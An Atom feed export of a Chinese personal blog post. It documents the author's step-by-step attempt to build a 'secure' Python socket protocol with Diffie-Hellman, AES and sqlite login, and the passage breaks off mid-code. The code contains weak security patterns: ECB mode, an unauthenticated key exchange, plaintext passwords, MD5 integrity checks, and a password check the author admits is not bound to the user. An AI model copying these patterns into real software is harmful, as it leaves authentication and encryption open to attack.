<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C12en</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-11-04T13:14:50.000Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>C12en</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安全协议设计过程</title>
    <link href="http://example.com/2024/10/11/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B/"/>
    <id>http://example.com/2024/10/11/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B/</id>
    <published>2024-10-11T09:58:59.000Z</published>
    <updated>2024-11-04T13:14:50.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><p>安全协议的目的就是传输数据 并且实现两个基础目标 安全性和可靠性 前者指数据不会被泄露 后者指数据不会被篡改<br>所以数据的传输过程 可以归类于四个阶段<br>“发”  “传“ ”收“ ”验“<br>发送阶段 需要对数据进行加密<br>这里有两种思路 一种是使用对称加密 还有一种是选择非对称加密 从安全性上 个人更倾向使用后者<br>传输阶段 这里打算使用socket来负责两个设备之间的通讯 同时还需要考虑进行身份验证 防止非法用户传输<br>接受阶段 为了防止攻击者使用过量的数据来瘫痪通讯 也许需要加入过滤机制来接受数据 这一点考虑到实现的复杂 是否加入还有待考虑<br>验证阶段 需要对接受到的数据进行检测 以防止数据被篡改或者是传输不完整</p><h1 id="传输阶段的一些尝试"><a href="#传输阶段的一些尝试" class="headerlink" title="传输阶段的一些尝试"></a>传输阶段的一些尝试</h1><p>对于socket的使用并不是非常熟练 打算先通过一些简单的交互来加深一下<br>购买了一台阿文云的低配服务器用来充当服务端<br>本机的ubuntu虚拟机充当客户端  使用python语言</p><h2 id="v0-1"><a href="#v0-1" class="headerlink" title="v0.1"></a>v0.1</h2><p>服务端代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s = socket.socket() #创建套接字 默认使用TCP协议</span><br><span class="line">s.bind((&quot;127.0.0.1&quot;,6666))</span><br><span class="line">s.listen(5) #最多连接5个客户端</span><br><span class="line">print(&quot;等待连接中&quot;)</span><br><span class="line">while 1:</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    print(sock,addr)</span><br><span class="line">    while 1:</span><br><span class="line">        text = sock.recv(1024) #接受的最大字节数为1024</span><br><span class="line">        if len(text.strip()) == 0:</span><br><span class="line">            print(&quot;服务端接收到客户端的数据为空&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;收到客户端发送的数据为：&#123;&#125;&quot;.format(text.decode()))</span><br><span class="line">            content = input(&quot;请输入发送给客户端的信息：&quot;)</span><br><span class="line">            sock.send(content.encode())</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((&quot;127.0.0.1&quot;,6666))</span><br><span class="line">print(&quot;成功连接&quot;)</span><br><span class="line">while 1:</span><br><span class="line">    data = input(&quot;需要向服务端传输的数据 :&quot;)</span><br><span class="line">    s.send(data.encode())</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    print(&quot;服务端发送的数据为:&#123;&#125;&quot;,format(text))</span><br></pre></td></tr></table></figure><p>实现效果<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410211301530.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410211301530.png" alt="image.png"></a><br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410211301497.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410211301497.png" alt="image.png"></a></p><h1 id="身份验证的实现"><a href="#身份验证的实现" class="headerlink" title="身份验证的实现"></a>身份验证的实现</h1><p>目前思考的是采用哪种身份验证方案<br>一种是采用第三方验证 比如auth0 这种的虽然实现起来更加高级且安全<br>第二种就是只需要做到安全的密钥交换 然后采用静态的用户密码库存储(也可以更换成sql) 然后加密传输用户名密码即可<br>考虑到第一种方法工作量太大 而且实现起来复杂(其实就是不会得边学边写) 还是乖乖采用第二种方法吧<br>这里采用dh算法 来实现在不安全的通讯中传输共享密钥  获得到共享密钥后 使用aes加密算法来加密用户名和密码<br>暂时是通过静态的用户名和密码库来实现身份验证 同时这里还存在一个攻击漏洞 对于密码的检测是遍历密码库中的所有密码 有满足的即可 并没有检验是否对应该用户</p><h2 id="v0-2"><a href="#v0-2" class="headerlink" title="v0.2"></a>v0.2</h2><p>服务端代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import random</span><br><span class="line">import math</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">users = [&#x27;user1&#x27;,&#x27;user2&#x27;,&#x27;user3&#x27;]</span><br><span class="line">passwds = [&#x27;aaaa&#x27;,&#x27;bbbb&#x27;,&#x27;cccc&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_server):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    public_key_client = sock.recv(1024)</span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client),sock,addr</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def Authentication(sock,shared_key):</span><br><span class="line">    key = shared_key[:16]  # 确保密钥长度符合要求（256 位）</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    decrypted_username = aes.decrypt(username)</span><br><span class="line">    username = (unpad(decrypted_username, 16)).decode()</span><br><span class="line">    if username in users:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        print(&quot;用户名正确&quot;)</span><br><span class="line">        password = (sock.recv(1024))</span><br><span class="line">        decrypted_password = aes.decrypt(password)</span><br><span class="line">        password = (unpad(decrypted_password, 16)).decode()</span><br><span class="line">        if password in passwds:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            print(&quot;密码正确&quot;)</span><br><span class="line">            return</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            sock.close()</span><br><span class="line">            exit()</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 0xB7E4DE6A253A6E3A1F7F6E2A8F9FBA6E8C6F1A8F9C7D7F7AA6A3E1E9B7EAE4E8C6F7F6B7E4D6E8C6A3E2E9E8F9F7E5E8C2D1E8F8C6D2E5A1F5E2A5E8D8C5D8A5E5B7A5F5A8D7A5F1E5B4D5A1</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    public_key_client,sock,addr = key_switch(s,public_key_server)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">    print(&quot;等待连接中&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print(sock,addr)</span><br><span class="line">        print(&quot;开始进行身份验证&quot;)</span><br><span class="line">        Authentication(sock,shared_key)</span><br><span class="line">        while 1:</span><br><span class="line">            text = sock.recv(1024) #接受的最大字节数为1024</span><br><span class="line">            if len(text.strip()) == 0:</span><br><span class="line">                print(&quot;服务端接收到客户端的数据为空&quot;)</span><br><span class="line">            else:</span><br><span class="line">                print(f&quot;收到客户端发送的数据为：&#123;text.decode()&#125;&quot;)</span><br><span class="line">                content = input(&quot;请输入发送给客户端的信息：&quot;)</span><br><span class="line">                sock.send(content.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import math</span><br><span class="line">import random</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;进行身份验证&quot;)</span><br><span class="line">    key = shared_key[:16]  # 确保密钥长度符合要求（256 位）</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    username_bytes = pad(username.encode(&#x27;utf-8&#x27;), AES.block_size)</span><br><span class="line">    encrypt_username = aes.encrypt(username_bytes)</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        password_bytes = pad(password.encode(&#x27;utf-8&#x27;),AES.block_size)</span><br><span class="line">        encrypt_password = aes.encrypt(password_bytes)</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 0xB7E4DE6A253A6E3A1F7F6E2A8F9FBA6E8C6F1A8F9C7D7F7AA6A3E1E9B7EAE4E8C6F7F6B7E4D6E8C6A3E2E9E8F9F7E5E8C2D1E8F8C6D2E5A1F5E2A5E8D8C5D8A5E5B7A5F5A8D7A5F1E5B4D5A1</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        data = input(&quot;需要向服务端传输的数据 :&quot;)</span><br><span class="line">        s.send(data.encode())</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        print(f&quot;服务端发送的数据为:&#123;text&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>针对账号密码的问题 进行了一波优化<br>使用sqlite3模块和sql数据库配合使用  实现账号密码的校验<br>暂时只打算把注册账号的权限给admin用户 在权限校验这块还存在问题 使用的是username的检测 严谨一点的应该加入数据库的参数 这样方便后面更改用户的操作权限<br>这一版大致优化了一些交互 不过还是很简陋 预计后面要增加窗口化界面<br>同时目前最关键的问题是 dh算法的g参数 我还没去跑出来一个较大的数 还是使用的2</p><h2 id="v0-3"><a href="#v0-3" class="headerlink" title="v0.3"></a>v0.3</h2><p>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import random</span><br><span class="line">import math</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line"></span><br><span class="line">users = [&#x27;user1&#x27;,&#x27;user2&#x27;,&#x27;user3&#x27;]</span><br><span class="line">passwds = [&#x27;aaaa&#x27;,&#x27;bbbb&#x27;,&#x27;cccc&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_server):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    public_key_client = sock.recv(1024)</span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client),sock,addr</span><br><span class="line"></span><br><span class="line">def decrypt_data(shared_key,data):</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16)).decode()</span><br><span class="line">    return data</span><br><span class="line">    </span><br><span class="line">def Authentication(sock,shared_key,cursor):</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    username = decrypt_data(shared_key,username)</span><br><span class="line">    cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    if result != None:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        print(&quot;用户名正确&quot;)</span><br><span class="line">        password = (sock.recv(1024))</span><br><span class="line">        decrypted_password = aes.decrypt(password)</span><br><span class="line">        password = (unpad(decrypted_password, 16)).decode()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE password = ?&quot;, (password,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            print(&quot;密码正确&quot;)</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1</span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0</span><br><span class="line">            return permission_value</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            sock.close()</span><br><span class="line">            exit()</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def menu(sock):</span><br><span class="line">    text = &quot;&quot;&quot;</span><br><span class="line">    菜单选项:</span><br><span class="line">    1. 传输文本数据</span><br><span class="line">    2. 传输附件</span><br><span class="line">    3. 注册新用户</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_txt():</span><br><span class="line">    #还没写</span><br><span class="line">    return</span><br><span class="line">def transfer_file():</span><br><span class="line">    #还没写</span><br><span class="line">    return</span><br><span class="line">def register(permission_value,sock,shared_key,cursor):</span><br><span class="line">    if permission_value == 0:</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        return</span><br><span class="line">    else :</span><br><span class="line">        sock.send(&quot;输入注册用户名&quot;.encode())</span><br><span class="line">        username = (sock.recv(1024))</span><br><span class="line">        username = decrypt_data(shared_key,username)</span><br><span class="line">        sock.send(&quot;输入密码&quot;.encode())</span><br><span class="line">        password = sock.recv(1024)</span><br><span class="line">        password = decrypt_data(shared_key,password)</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password))</span><br><span class="line">            conn.commit()</span><br><span class="line">            sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    public_key_client,sock,addr = key_switch(s,public_key_server)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">    print(&quot;等待连接中&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print(sock,addr)</span><br><span class="line">        print(&quot;开始进行身份验证&quot;)</span><br><span class="line">        permission_value = Authentication(sock,shared_key,cursor)</span><br><span class="line">        while 1:</span><br><span class="line">            menu(sock)</span><br><span class="line">            choice = (sock.recv(1024)).decode()</span><br><span class="line">            if choice == &quot;1&quot;:</span><br><span class="line">                transfer_txt()</span><br><span class="line">            elif choice == &quot;2&quot;:</span><br><span class="line">                transfer_file()</span><br><span class="line">            elif choice == &quot;3&quot;:</span><br><span class="line">                register(permission_value,sock,shared_key,cursor)</span><br><span class="line">            else:</span><br><span class="line">                sock.send(&quot;输入的选项错误 请重新输入&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import math</span><br><span class="line">import random</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):</span><br><span class="line">    key = shared_key[:16]  # 确保密钥长度符合要求（256 位）</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    data_bytes = pad(data.encode(&#x27;utf-8&#x27;), AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;进行身份验证&quot;)</span><br><span class="line">    key = shared_key[:16]  # 确保密钥长度符合要求（256 位）</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        print(text)</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        encrypt_password = encrypt_data(shared_key,password)</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">def register(s,shared_key):</span><br><span class="line">    print((s.recv(1024)).decode())</span><br><span class="line">    username = input(&quot;输入用户名&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    password = input(&quot;输入密码&quot;)</span><br><span class="line">    encrypt_password = encrypt_data(shared_key,password)</span><br><span class="line">    s.send(encrypt_password)</span><br><span class="line">    print((s.recv(1024)).decode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print((s.recv(1024)).decode())</span><br><span class="line">        choice = input(&quot;输入选项:&quot;)</span><br><span class="line">        s.send(choice.encode())</span><br><span class="line">        if choice == &quot;3&quot;:</span><br><span class="line">            register(s,shared_key)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="传输阶段的数据加密"><a href="#传输阶段的数据加密" class="headerlink" title="传输阶段的数据加密"></a>传输阶段的数据加密</h1><p>这一章节的目的是设计出来一个数据包格式<br>常规的应该是由这几个部分组成 包头+密文长度+密文+校验和<br>这就要设计到两个算法 消息加密算法以及消息摘要算法<br>加密还是老样子 使用dh算法得到的共享密钥来进行aes加密<br>摘要算法的目的是为了保证消息的完整性<br>这里就使用md5算法<br>目前打算将数据包格式定义成下图所示<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411011046913.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411011046913.png" alt="image.png"></a><br>消息类型负责优化原本的服务端和客户端 原本的服务端针对传输数据类型不同以及新增用户的功能 是采用了菜单形式 过于简单且多了许多额外的交互 这里选择将choice变量融合到数据中一起传输<br>然后还得完善上一章节预留的 传输文件 这里打算暂时只包括传输图像 音频 文本文件 更多的格式和文件类型由于没有经过测试 不知道能不能完整的传输过去<br>对于服务端来说 接受到文件后 还需要判断属于哪种类型的文件 方便保存<br>想到的是两种方案  一种是客户端发送文件的时候额外发送文件的类型 服务端接受后按照类型保存文件<br>第二种是 在服务端接受数据后利用magic库来判断文件类型<br>但是这两种方法 似乎都很容易被绕过 要是客户端将马伪造成正常格式的文件传过来就不好玩了<br>虽然但是 本次只是打算设计一个能用的安全协议 所以安全性这里就只是预警一下 不去研究如何改进了 这里采用第二种方法<br>在编写传输图像文件的时候 遇到了一个新的问题<br>按照上面的数据包 单个数据包最多传输0xffffbytes 但是一个图像不止这些字节 所以就需要分段传输  那么我们就需要在数据包格式中的消息类型 加入是否属于切片传输的位置 来供服务端判断<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411011809966.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411011809966.png" alt="image.png"></a><br>迭代了数据包格式 前面的判断位之所以给了4byte 考虑到服务端处理切片数据的时候 需要确定当前是否属于最后一个切片(常规的协议一般在数据包中增加当前切片对于整段数据的偏移 这里我打算做简单一点) 所以前2个byte用来存储一共有多少个切片 后两个byte用来存储当前是第几个切片<br>而检测是否属于切片数据包也很容易 只要这4个byte不为\x00即可<br>同时 这个版本还优化了之前代码中的一些逻辑漏洞 容易造成服务端的server运行中断</p><h2 id="v0-4"><a href="#v0-4" class="headerlink" title="v0.4"></a>v0.4</h2><p>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import magic</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">users = [&#x27;user1&#x27;,&#x27;user2&#x27;,&#x27;user3&#x27;]</span><br><span class="line">passwds = [&#x27;aaaa&#x27;,&#x27;bbbb&#x27;,&#x27;cccc&#x27;]</span><br><span class="line"></span><br><span class="line">mime = magic.Magic(mime=True)</span><br><span class="line">conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    # 创建 MD5 哈希对象</span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    # 更新哈希对象</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line"></span><br><span class="line">    # 获取十六进制的哈希值</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_server):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    public_key_client = sock.recv(1024)</span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client),sock,addr</span><br><span class="line"></span><br><span 